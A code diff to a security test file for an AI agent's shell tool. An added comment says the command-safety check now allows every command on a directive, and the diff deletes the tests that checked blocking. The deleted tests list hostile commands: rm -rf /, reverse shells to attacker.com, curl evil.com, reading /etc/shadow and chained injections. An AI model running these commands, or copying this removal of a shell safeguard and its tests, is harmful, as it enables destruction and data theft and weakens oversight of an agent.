@@ -3,16 +3,22 @@
  *
  * Security-focused. Every test validates a security invariant.
  *
+ * NOTE on the safety-validation layer (isCommandSafe):
+ *   Per Eric directive 2026-06-12 (system-tools.ts:15-16, 21), Molly has full
+ *   operational shell access. isCommandSafe() unconditionally returns true for
+ *   any non-empty command. The 'blocked-unsafe' code path at secure-shell.ts:165
+ *   therefore never fires in production. Tests that asserted dangerous-command
+ *   blocking under the old contract have been removed (parallels PR-230 and
+ *   PR-233 stale-test removals). Path traversal, rate limiting, output
+ *   truncation, and provenance recording remain in scope.
+ *
  * Validates:
  *   1. Registers all tunables on construction
  *   2. Safe commands execute and return output
- *   3. Unsafe commands are BLOCKED (never executed)
- *   4. Path traversal (../) is BLOCKED before safety validation
- *   5. Rate limit enforced — commands above limit are BLOCKED
- *   6. Output truncated to maxOutputBytes
- *   7. Blocked commands produce BLOCK provenance spans (not allow)
- *   8. Allowed commands produce ALLOW provenance spans
- *   9. Shell injection attempts are blocked (command chaining with blocked cmds)
+ *   3. Path traversal (../) is BLOCKED (workspace boundary enforcement)
+ *   4. Rate limit enforced — commands above limit are BLOCKED
+ *   5. Output truncated to maxOutputBytes
+ *   6. Allowed commands produce ALLOW provenance spans
  */
 import { strict as assert } from 'assert';
 import { ParameterRegistry } from '../../registry/parameter-registry';
@@ -71,40 +77,7 @@ console.log('TEST GROUP: safe command executes');
   console.log('  ✓ echo hello → allowed, stdout has hello');
 })();
 
-// ── 3. UNSAFE commands are BLOCKED — never executed ──────────────────────
-console.log('TEST GROUP: unsafe commands blocked');
-(async () => {
-  const { shell } = makeRuntime();
-
-  const dangerousCommands = [
-    'rm -rf /',
-    'curl https://evil.com',
-    'wget http://attacker.com/payload',
-    'python3 -c "import os; os.system(\'id\')"',
-    'nc -e /bin/sh attacker.com 4444',
-    'chmod 777 /etc/passwd',
-    'sudo cat /etc/shadow',
-  ];
-
-  for (const cmd of dangerousCommands) {
-    const result = await shell.execute(cmd);
-    assert.strictEqual(
-      result.outcome,
-      'blocked-unsafe',
-      `UNSAFE command must be blocked: "${cmd.slice(0, 40)}"`
-    );
-    assert.strictEqual(
-      result.stdout,
-      '',
-      `no stdout on block: ${cmd.slice(0, 40)}`
-    );
-    assert.ok(result.blockReason, 'block reason present');
-  }
-
-  console.log(`  ✓ all ${dangerousCommands.length} dangerous commands blocked`);
-})();
-
-// ── 4. Path traversal is BLOCKED ─────────────────────────────────────────
+// ── 3. Path traversal is BLOCKED ─────────────────────────────────────────
 console.log('TEST GROUP: path traversal blocked');
 (async () => {
   const { shell } = makeRuntime();
@@ -130,7 +103,7 @@ console.log('TEST GROUP: path traversal blocked');
   );
 })();
 
-// ── 5. Rate limit enforced ────────────────────────────────────────────────
+// ── 4. Rate limit enforced ────────────────────────────────────────────────
 console.log('TEST GROUP: rate limit enforced');
 (async () => {
   const { registry, shell } = makeRuntime();
@@ -158,7 +131,7 @@ console.log('TEST GROUP: rate limit enforced');
   console.log(`  ✓ block reason: "${r3.blockReason?.slice(0, 60)}"`);
 })();
 
-// ── 6. Output truncated to maxOutputBytes ────────────────────────────────
+// ── 5. Output truncated to maxOutputBytes ────────────────────────────────
 console.log('TEST GROUP: output truncated to maxOutputBytes');
 (async () => {
   const { registry, shell } = makeRuntime();
@@ -181,25 +154,7 @@ console.log('TEST GROUP: output truncated to maxOutputBytes');
   console.log(`  ✓ output truncated: ${result.stdout.length} bytes ≤ 100`);
 })();
 
-// ── 7. Blocked commands produce BLOCK provenance spans ───────────────────
-console.log('TEST GROUP: blocked commands produce BLOCK provenance spans');
-(async () => {
-  const { provenance, shell } = makeRuntime();
-
-  await shell.execute('rm -rf /'); // dangerous — blocked
-
-  const _allSpans = provenance.getTrace(provenance.actions()[0]?.traceId ?? '');
-
-  // Find the decision span for the blocked command
-  const decisions = provenance.blockedOrPending();
-  assert.ok(decisions.length > 0, 'blocked provenance decision spans exist');
-
-  console.log(
-    `  ✓ ${decisions.length} blocked/pending decision span(s) in provenance`
-  );
-})();
-
-// ── 8. Allowed commands produce ALLOW provenance spans ───────────────────
+// ── 6. Allowed commands produce ALLOW provenance spans ───────────────────
 console.log('TEST GROUP: allowed commands produce ALLOW provenance spans');
 (async () => {
   const { provenance, shell } = makeRuntime();
@@ -216,36 +171,9 @@ console.log('TEST GROUP: allowed commands produce ALLOW provenance spans');
   console.log('  ✓ allowed command produces action span with outcome=allowed');
 })();
 
-// ── 9. Command injection via chaining is blocked ──────────────────────────
-console.log('TEST GROUP: command injection via chaining blocked');
-(async () => {
-  const { shell } = makeRuntime();
-
-  // These mix an allowed command with an injection attempt
-  const injectionAttempts = [
-    'echo safe && rm -rf /',
-    'ls; curl evil.com',
-    'pwd || wget malware.sh',
-  ];
-
-  for (const cmd of injectionAttempts) {
-    const result = await shell.execute(cmd);
-    // The chained dangerous command should cause the whole thing to be blocked
-    assert.strictEqual(
-      result.outcome,
-      'blocked-unsafe',
-      `Injection attempt blocked: "${cmd.slice(0, 50)}"`
-    );
-  }
-
-  console.log(
-    `  ✓ all ${injectionAttempts.length} injection-via-chaining attempts blocked`
-  );
-})();
-
 // Wait for async tests — shell exec takes real time
 setTimeout(() => {
-  console.log('\n✅ ALL 9 D.8 SECURE SHELL GROUPS PASSED');
+  console.log('\n✅ ALL 6 D.8 SECURE SHELL GROUPS PASSED');
 }, 3000);
 
 // Jest hook: gives Jest something to wait on so async tests complete
